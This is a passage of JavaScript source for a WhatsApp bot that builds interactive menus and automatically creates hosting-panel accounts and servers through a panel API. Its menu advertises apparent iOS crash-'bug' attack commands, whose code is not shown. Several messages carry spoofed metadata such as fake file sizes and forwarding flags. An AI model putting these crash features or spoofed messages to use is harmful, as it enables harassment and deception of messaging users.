©𝙘𝙖𝙮𝙬𝙯𝙯																						
											`
										}),
										footer: proto.Message.InteractiveMessage.Footer.fromObject({
											text: ``
										}),
										header: proto.Message.InteractiveMessage.Header.fromObject({
											title: ``,
											//subtitle: "only visible if someone replies to this message",
											hasMediaAttachment: true,
											...(await prepareWAMessageMedia({ image: { url: "https://files.catbox.moe/kl61pt.jpg" } }, { upload: cay.waUploadToServer }))
										}),
										nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
											buttons: [
												{
													"name": "cta_url",
													"buttonParamsJson": "{\"display_text\":\"々\",\"url\":\"https://t.me/caywzzneh\",\"merchant_url\":\"https://t.me/caywzzneh\"}"
              }
                ]
										})
            },
									{
								
										body: proto.Message.InteractiveMessage.Body.fromObject({
											text: `
_*U S E R I N F O*_ 🌨️		
⟣──────────
くそ > NAME : ${pushname}
くそ > STATUS :  _*${isCreator ? 'OWNER' : isPremium ? 'PREMIUM' : 'NONE'}*_
くそ > DEV : CAYWZZ
⟣──────────
𝘽𝙐𝙂𝙄𝙊𝙎
> 🌌 _BUGIOS_		
> 🌌 _XCIOS (TYPE BUG)_
> 🌌 _BUGIOSPAY ( Maintance)_
> 🌌 _BUGIOSCALL_
⟣──────────
©𝙘𝙖𝙮𝙬𝙯𝙯																					
	`
										}),
										footer: proto.Message.InteractiveMessage.Footer.fromObject({
											text: ``
										}),
										header: proto.Message.InteractiveMessage.Header.fromObject({
											title: ``,
											//subtitle: "only visible if someone replies to this message",
											hasMediaAttachment: true,
											...(await prepareWAMessageMedia({ image: { url: "https://files.catbox.moe/kl61pt.jpg" } }, { upload: cay.waUploadToServer }))
										}),
										nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
											buttons: [
												{
													"name": "cta_url",
													"buttonParamsJson": "{\"display_text\":\"々\",\"url\":\"https://t.me/caywzzneh\",\"merchant_url\":\"https://t.me/caywzzneh\"}"
              }
                ]
										})
            }
          ]
							})
						})
					}
				}
			}, {})
			await cay.relayMessage(msg.key.remoteJid, msg.message, {
				messageId: msg.key.id
			})
		}
		break
		case "ownermenu":
case "menuowner":{
const tek = `
👋 Hello ${pushname}, I am the *Whatsapp Bot* created by Caywzz. I'm here to assist you with anything you might need, making your interaction smoother and more efficient.       
Selamat ${time2} !
ᝄ ⌜ O W N E R M E N U ⌟
䒘 > .msgx
䒘 > .addprem
䒘 > .deleteprem
䒘 > .dec (decryptjs)
䒘 > .enc (encryptjs)
⟣──────────
`
cay.sendMessage(m?.chat, {
    document: fs.readFileSync("./package.json"),
    jpegThumbnail: { url: global.thumb4 },
    fileName: `${time2}`,
    fileLength: 99999999999999,
    pageCount: "100",
    mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    caption: tek,
    contextInfo: {
        externalAdReply: {
            containsAutoReply: true,
            mediaType: 1,
            mediaUrl: '',
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: global.group,
            thumbnailUrl: global.thumb,
            title: global.namaowner,
            body: global.namabot,
        },
        forwardingScore: 10,
        isForwarded: true,
        mentionedJid: [m?.sender],
        businessMessageForwardInfo: {
            businessOwnerJid: botNumber
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: '120363357312070270@newsletter',
            serverMessageId: null,
            newsletterName: `${global.namabot}`
        }
    }
}, { quoted: { key: { participant: `6287875411618@s.whatsapp.net`, remoteJid: `6287875411618@s.whatsapp.net` }, message: { conversation: `Hallo! ${pushname}`}}});

cay.sendMessage(m.chat, {audio: fs.readFileSync('./media/music.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
	case "cpanelmenu":
case "menucpanel":{
const tek = `
👋 Hello ${pushname}, I am the *Whatsapp Bot* created by Caywzz. I'm here to assist you with anything you might need, making your interaction smoother and more efficient.       
Selamat ${time2} !
ᝄ ⌜ C P A N E L M E N U ⌟
䒘 > .Cpanel
䒘 > .Cpanel2
䒘 > .Cpanel3
䒘 > .cp1gb - cpunli
䒘 > .cp1gbv2 - cpunliv2
䒘 > .cp1gbv3 - cpunliv3
⟣──────────
`
cay.sendMessage(m?.chat, {
    document: fs.readFileSync("./package.json"),
    jpegThumbnail: { url: global.thumb4 },
    fileName: `${time2}`,
    fileLength: 99999999999999,
    pageCount: "100",
    mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    caption: tek,
    contextInfo: {
        externalAdReply: {
            containsAutoReply: true,
            mediaType: 1,
            mediaUrl: '',
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: global.group,
            thumbnailUrl: global.thumb,
            title: global.namaowner,
            body: global.namabot,
        },
        forwardingScore: 10,
        isForwarded: true,
        mentionedJid: [m?.sender],
        businessMessageForwardInfo: {
            businessOwnerJid: botNumber
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: '120363357312070270@newsletter',
            serverMessageId: null,
            newsletterName: `${global.namabot}`
        }
    }
}, { quoted: { key: { participant: `6287875411618@s.whatsapp.net`, remoteJid: `6287875411618@s.whatsapp.net` }, message: { conversation: `Hallo! ${pushname}`}}});

cay.sendMessage(m.chat, {audio: fs.readFileSync('./media/music.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
// Case Cpanel
case 'cpanel': case 'addpanel':{
//if (!isRegistered) return registerbut(noregis)
if (!isCreator) return reply("Khusus Owner")
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!args[0]) return m.reply(example("nama"))
global.panel = [text.toLowerCase()]
let teksnya = "Silahkan Pilih Ram Server Panel"
let u = `*\`</> 乂${command}乂 </>\`*\n
Silahkan Pilih Ram Server Panel!!`
let dits = ``
let mmm = ``
let info = `${monospace(mmm)}`
 const { proto, generateWAMessageFromContent, prepareWAMessageMedia } = require("@whiskeysockets/baileys") 
	
	const msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 contextInfo: {
 	mentionedJid: [m.sender], 
 	isForwarded: true, 
	 forwardedNewsletterMessageInfo: {
			newsletterJid: '120363357312070270@newsletter',
			newsletterName: 'Caywzz Cpanel', 
			serverMessageId: -1
		},
	businessMessageForwardInfo: { businessOwnerJid: cay.decodeJid(cay.user.id) },
	forwardingScore: 256,
 externalAdReply: { 
 title: 'Caywzz cpanel', 
 thumbnailUrl: 'https://files.catbox.moe/v29m2w.jpg', 
 sourceUrl: 'https://t.me/caywzzneh',
 mediaType: 2,
 renderLargerThumbnail: false
 }
 }, 
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: `*\`</> 乂${command}乂 </>\`*`,
 }), 
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 hasMediaAttachment: false
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards: [ 
 {
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `Silahkan Pilih Ram Server Panel!!`,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/v29m2w.jpg' } }, { upload: cay.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
{
"name": "single_select",
"buttonParamsJson": `{ "title": "Pilih Ram Panel", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By cay\", "rows": [{ "header": "Ram Unlimited", "title": "Ram Unlimited | CPU Unlimited", "id": ".cpunli" }, 
{ "header": "Ram 1GB", "title": "Ram 1GB | CPU 40%", "id": ".cp1gb" }, 
{ "header": "Ram 2GB", "title": "Ram 2GB | CPU 60%", "id": ".cp2gb" }, 
{ "header": "Ram 3GB", "title": "Ram 3GB | CPU 80%", "id": ".cp3gb" }, 
{ "header": "Ram 4GB", "title": "Ram 4GB | CPU 100%", "id": ".cp4gb" }, 
{ "header": "Ram 5GB", "title": "Ram 5GB | CPU 120%", "id": ".cp5gb" }, 
{ "header": "Ram 6GB", "title": "Ram 6GB | CPU 140%", "id": ".cp6gb" }, 
{ "header": "Ram 7GB", "title": "Ram 7GB | CPU 160%", "id": ".cp7gb" }, 
{ "header": "Ram 8GB", "title": "Ram 8GB | CPU 180%", "id": ".cp8gb" }, 
{ "header": "Ram 9GB", "title": "Ram 9GB | CPU 200%", "id": ".cp9gb" }, 
{ "header": "Ram 10GB", "title": "Ram 10GB | CPU 220%", "id": ".cp10gb" }]}]}`
}
 ]
 })
 }
 ]
 })
 })
 }
 }
}, { userJid: m.chat, quoted: qtext2 })
cay.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })

}
break
case "cpanel2": case "addpanel2": case "buatpanel2": {
if (!isCreator) return reply("khusus owner")
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
global.tempuser = crypto.randomBytes(3).toString('hex')
global.temppw = crypto.randomBytes(4).toString('hex')
let teksnya = "Silahkan Pilih Ram Server Panel, Username & Password Panel Akan Dibuat Secara Otomatis Oleh Bot"
let u = `*\`</> 乂${command}乂 </>\`*\n`
let dits = ``
let mmm = ``
let info = `${monospace(mmm)}`
 const { proto, generateWAMessageFromContent, prepareWAMessageMedia } = require("@whiskeysockets/baileys") 
	
	const msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 contextInfo: {
 	mentionedJid: [m.sender], 
 	isForwarded: true, 
	 forwardedNewsletterMessageInfo: {
			newsletterJid: '120363357312070270@newsletter',
			newsletterName: 'Caywzz Cpanel2 otomatis', 
			serverMessageId: -1
		},
	businessMessageForwardInfo: { businessOwnerJid: cay.decodeJid(cay.user.id) },
	forwardingScore: 256,
 externalAdReply: { 
 title: 'Caywzz Cpanel2 otomatis', 
 thumbnailUrl: 'https://files.catbox.moe/v29m2w.jpg', 
 sourceUrl: 'https://t.me/caywzzneh',
 mediaType: 2,
 renderLargerThumbnail: false
 }
 }, 
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: `*\`</> 乂${command}乂 </>\`*`,
 }), 
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 hasMediaAttachment: false
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards: [ 
 {
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `Silahkan Pilih Ram Server Panel, Username & Password Panel Akan Dibuat Secara Otomatis Oleh Bot!`,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://files.catbox.moe/v29m2w.jpg" } }, { upload: cay.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
{
"name": "single_select",
"buttonParamsJson": `{ "title": "Pilih Ram Panel", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By ${namaowner}\", "rows": [{ "header": "Ram Unlimited", "title": "Ram Unlimited | CPU Unlimited", "id": ".cpunliv2" }, 
{ "header": "Ram 1GB", "title": "Ram 1GB | CPU 40%", "id": ".cp1gbv2" }, 
{ "header": "Ram 2GB", "title": "Ram 2GB | CPU 60%", "id": ".cp2gbv2" }, 
{ "header": "Ram 3GB", "title": "Ram 3GB | CPU 80%", "id": ".cp3gbv2" }, 
{ "header": "Ram 4GB", "title": "Ram 4GB | CPU 100%", "id": ".cp4gbv2" }, 
{ "header": "Ram 5GB", "title": "Ram 5GB | CPU 120%", "id": ".cp5gbv2" }, 
{ "header": "Ram 6GB", "title": "Ram 6GB | CPU 140%", "id": ".cp6gbv2" }, 
{ "header": "Ram 7GB", "title": "Ram 7GB | CPU 160%", "id": ".cp7gbv2" }, 
{ "header": "Ram 8GB", "title": "Ram 8GB | CPU 180%", "id": ".cp8gbv2" }, 
{ "header": "Ram 9GB", "title": "Ram 9GB | CPU 200%", "id": ".cp9gbv2" }, 
{ "header": "Ram 10GB", "title": "Ram 10GB | CPU 220%", "id": ".cp10gbv2" }]}]}`
}
 ]
 })
 }
 ]
 })
 })
 }
 }
}, { userJid: m.chat, quoted: qtext2 })
cay.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })

}
break
case "cpanel3": case "addpanel3": case "buatpanel3": {
if (!isCreator) return reply("Khusus Owner")
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!args[0]) return m.reply(example("nama,6283XXX"))
if (!text.split(",")) return m.reply(example("nama,6283XXX"))
var buyyer = text.split(",")[0].toLowerCase()
if (!buyyer) return m.reply(example("nama,6283XXX"))
var ceknyaa = text.split(",")[1]
if (!ceknyaa) return m.reply(example("nama,6283XXX"))
var client = text.split(",")[1].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await cay.onWhatsApp(ceknyaa)
if (!check[0].exists) return m.reply("Nomor Buyyer Tidak Valid!")
global.panel3 = [buyyer, client]
let teksnya = "Silahkan Pilih Ram Server Panel"
let u = `*\`</> 乂${command}乂 </>\`*\n`
let dits = ``
let mmm = ``
let info = `${monospace(mmm)}`
 const { proto, generateWAMessageFromContent, prepareWAMessageMedia } = require("@whiskeysockets/baileys") 
	
	const msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 contextInfo: {
 	mentionedJid: [m.sender], 
 	isForwarded: true, 
	 forwardedNewsletterMessageInfo: {
			newsletterJid: '120363357312070270@newsletter',
			newsletterName: 'Caywzz Cpanel3 otomatis', 
			serverMessageId: -1
		},
	businessMessageForwardInfo: { businessOwnerJid: cay.decodeJid(cay.user.id) },
	forwardingScore: 256,
 externalAdReply: { 
 title: 'Caywzz Cpanel3 otomatis', 
 thumbnailUrl: 'https://files.catbox.moe/v29m2w.jpg', 
 sourceUrl: 'https://t.me/caywzzneh',
 mediaType: 2,
 renderLargerThumbnail: false
 }
 }, 
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: `*\`</> 乂${command}乂 </>\`*`,
 }), 
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 hasMediaAttachment: false
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards: [ 
 {
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `Silahkan Pilih Ram Server Panel!`,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://files.catbox.moe/v29m2w.jpg" } }, { upload: cay.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
{
"name": "single_select",
"buttonParamsJson": `{ "title": "Pilih Ram Panel", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By ${namaowner}\", "rows": [{ "header": "Ram Unlimited", "title": "Ram Unlimited | CPU Unlimited", "id": ".cpunliv3" }, 
{ "header": "Ram 1GB", "title": "Ram 1GB | CPU 40%", "id": ".cp1gbv3" }, 
{ "header": "Ram 2GB", "title": "Ram 2GB | CPU 60%", "id": ".cp2gbv3" }, 
{ "header": "Ram 3GB", "title": "Ram 3GB | CPU 80%", "id": ".cp3gbv3" }, 
{ "header": "Ram 4GB", "title": "Ram 4GB | CPU 100%", "id": ".cp4gbv3" }, 
{ "header": "Ram 5GB", "title": "Ram 5GB | CPU 120%", "id": ".cp5gbv3" }, 
{ "header": "Ram 6GB", "title": "Ram 6GB | CPU 140%", "id": ".cp6gbv3" }, 
{ "header": "Ram 7GB", "title": "Ram 7GB | CPU 160%", "id": ".cp7gbv3" }, 
{ "header": "Ram 8GB", "title": "Ram 8GB | CPU 180%", "id": ".cp8gbv3" }, 
{ "header": "Ram 9GB", "title": "Ram 9GB | CPU 200%", "id": ".cp9gbv3" }, 
{ "header": "Ram 10GB", "title": "Ram 10GB | CPU 220%", "id": ".cp10gbv3" }]}]}`
}
 ]
 })
 }
 ]
 })
 })
 }
 }
}, { userJid: m.chat, quoted: qtext2 })
cay.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })

}
break

case "cp1gb": case "cp2gb": case "cp3gb": case "cp4gb": case "cp5gb": case "cp6gb": case "cp7gb": case "cp8gb": case "cp9gb": case "cp10gb": case "cp11gb": case "cp12gb": case "cp13gb": case "cp14gb": case "cp15gb": case "cp16gb": case "cp17gb": case "cp18gb": case "cp19gb": case "cp20gb": case "cp21gb": case "cp22gb": case "cp23gb": case "cp24gb": case "cp25gb": case "cp26gb": case "cp27gb": case "cp28gb": case "cp29gb": case "cp30gb": case "cp31gb": case "cp32gb": case "cp33gb": case "cp34gb": case "cp35gb": case "cp36gb": case "cp37gb": case "cp38gb": case "cp39gb": case "cp40gb": case "cp41gb": case "cp42gb": case "cp43gb": case "cp44gb": case "cp45gb": case "cp46gb": case "cp47gb": case "cp48gb": case "cp49gb": case "cp50gb": case "cpunli": {
if (!isCreator) return reply("Khusus Owner")
if (global.panel == null) return m.reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gb") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gb") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gb") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gb") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gb") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gb") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gb") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gb") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gb") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cp10gb") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else if (command == "cp11gb") {
ram = "11125"
disknya = "11125"
cpu = "360"
} else if (command == "cp12gb") {
ram = "12125"
disknya = "12125"
cpu = "390"
} else if (command == "cp13gb") {
ram = "13125"
disknya = "13125"
cpu = "420"
} else if (command == "cp14gb") {
ram = "14125"
disknya = "14125"
cpu = "450"
} else if (command == "cp15gb") {
ram = "15125"
disknya = "15125"
cpu = "480"
} else if (command == "cp16gb") {
ram = "16125"
disknya = "16125"
cpu = "510"
} else if (command == "cp17gb") {
ram = "17125"
disknya = "17125"
cpu = "540"
} else if (command == "cp18gb") {
ram = "18125"
disknya = "18125"
cpu = "570"
} else if (command == "cp19gb") {
ram = "19125"
disknya = "19125"
cpu = "600"
} else if (command == "cp20gb") {
ram = "20125"
disknya = "20125"
cpu = "630"
} else if (command == "cp21gb") {
ram = "21125"
disknya = "21125"
cpu = "660"
} else if (command == "cp22gb") {
ram = "22125"
disknya = "22125"
cpu = "660"
} else if (command == "cp23gb") {
ram = "23125"
disknya = "23125"
cpu = "690"
} else if (command == "cp24gb") {
ram = "24125"
disknya = "24125"
cpu = "720"
} else if (command == "cp25gb") {
ram = "25125"
disknya = "25125"
cpu = "750"
} else if (command == "cp26gb") {
ram = "26125"
disknya = "26125"
cpu = "780"
} else if (command == "cp27gb") {
ram = "27125"
disknya = "27125"
cpu = "810"
} else if (command == "cp28gb") {
ram = "28125"
disknya = "28125"
cpu = "840"
} else if (command == "cp29gb") {
ram = "29125"
disknya = "29125"
cpu = "870"
} else if (command == "cp30gb") {
ram = "30125"
disknya = "30125"
cpu = "900"
} else if (command == "cp31gb") {
ram = "31125"
disknya = "31125"
cpu = "930"
} else if (command == "cp32gb") {
ram = "32125"
disknya = "32125"
cpu = "960"
} else if (command == "cp33gb") {
ram = "33125"
disknya = "33125"
cpu = "990"
} else if (command == "cp34gb") {
ram = "34125"
disknya = "34125"
cpu = "1020"
} else if (command == "cp35gb") {
ram = "35125"
disknya = "35125"
cpu = "1050"
} else if (command == "cp36gb") {
ram = "36125"
disknya = "35125"
cpu = "1080"
} else if (command == "cp37gb") {
ram = "37125"
disknya = "37125"
cpu = "1110"
} else if (command == "cp38gb") {
ram = "38125"
disknya = "38125"
cpu = "1240"
} else if (command == "cp39gb") {
ram = "39125"
disknya = "39125"
cpu = "1270"
} else if (command == "cp40gb") {
ram = "40125"
disknya = "40125"
cpu = "1200"
} else if (command == "cp41gb") {
ram = "41125"
disknya = "41125"
cpu = "1230"
} else if (command == "cp42gb") {
ram = "42125"
disknya = "42125"
cpu = "1260"
} else if (command == "cp43gb") {
ram = "43125"
disknya = "43125"
cpu = "1290"
} else if (command == "cp44gb") {
ram = "44125"
disknya = "44125"
cpu = "1320"
} else if (command == "cp45gb") {
ram = "45125"
disknya = "45125"
cpu = "1350"
} else if (command == "cp46gb") {
ram = "46125"
disknya = "46125"
cpu = "1380"
} else if (command == "cp47gb") {
ram = "47125"
disknya = "47125"
cpu = "1410"
} else if (command == "cp48gb") {
ram = "48125"
disknya = "48125"
cpu = "1440"
} else if (command == "cp49gb") {
ram = "49125"
disknya = "49125"
cpu = "1470"
} else if (command == "cp50gb") {
ram = "50125"
disknya = "50125"
cpu = "1500"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isCreator) return reply("Khusus Owner")
let username = global.panel[0].toLowerCase()
let email = username+"@Hutao.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (isGroup) {
orang = m.sender
await m.reply("*Data Akun Sudah Dikirim Ke Private Chat")
} else {
orang = m.chat
}
var teks = `${monospace('Chat Privat data Panel')}

 ╭─ 𝗗𝗔𝗧𝗔 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔 」
 │• 🖥 _ID SERVER_ : ${server.id} 
 │• 💾 _RAM_ : ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
 │• 📈 _CPU_ : ${cpu == "0" ? "Unlimited" : cpu+"%"}
 │• 📡 _STORAGE_ : ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
 │• 🗒️ _CREATED_ : ${desc}
 │• 🖥 _USERNAME_ : ${monospa(user.username)}
 │• 🛡 _PASSWORD_ : ${monospa(global.temppw.toString())}
 │• 🔗 _LOGIN_ : ${global.domain}
 ╰────`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await cay.relayMessage(orang, msgii.message, { 
messageId: msgii.key.id 
})
global.panel = null
}
break
case "cp1gbv2": case "cp2gbv2": case "cp3gbv2": case "cp4gbv2": case "cp5gbv2": case "cp6gbv2": case "cp7gbv2": case "cp8gbv2": case "cp9gbv2": case "cp10gbv2": case "cpunliv2": {
if (global.tempuser == null) return m.reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gbv2") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gbv2") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gbv2") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gbv2") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gbv2") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gbv2") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gbv2") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gbv2") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gbv2") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cp10gbv2") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isCreator) return reply("Khusus Owner")
let username = global.tempuser.toLowerCase()
let email = username+"@Hutao.com"
let name = capital(username)
let password = global.temppw
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (isGroup) {
orang = m.sender
await m.reply(`*DATA AKUN PANEL*\nData Akun Sudah Dikirim Ke Private Chat`)
} else {
orang = m.chat
}
var teks = `${monospace('Chat Privat data Panel')}

 ╭─ 𝗗𝗔𝗧𝗔 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔 」
 │• 🖥 _ID SERVER_ : ${server.id} 
 │• 💾 _RAM_ : ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
 │• 📈 _CPU_ : ${cpu == "0" ? "Unlimited" : cpu+"%"}
 │• 📡 _STORAGE_ : ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
 │• 🗒️ _CREATED_ : ${desc}
 │• 🖥 _USERNAME_ : ${monospa(user.username)}
 │• 🛡 _PASSWORD_ : ${monospa(global.temppw.toString())}
 │• 🔗 _LOGIN_ : ${global.domain}
 ╰────`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
